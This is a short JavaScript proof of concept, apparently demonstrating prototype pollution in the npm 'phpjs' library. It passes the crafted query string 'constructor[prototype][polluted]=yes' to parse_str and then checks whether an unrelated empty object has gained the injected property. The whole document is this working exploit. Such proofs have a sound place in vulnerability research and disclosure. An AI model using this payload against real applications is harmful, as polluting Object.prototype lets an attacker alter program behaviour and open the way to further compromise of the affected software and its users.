var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const p = require('phpjs');
p.parse_str('constructor[prototype][polluted]=yes', obj);
console.log({}.polluted);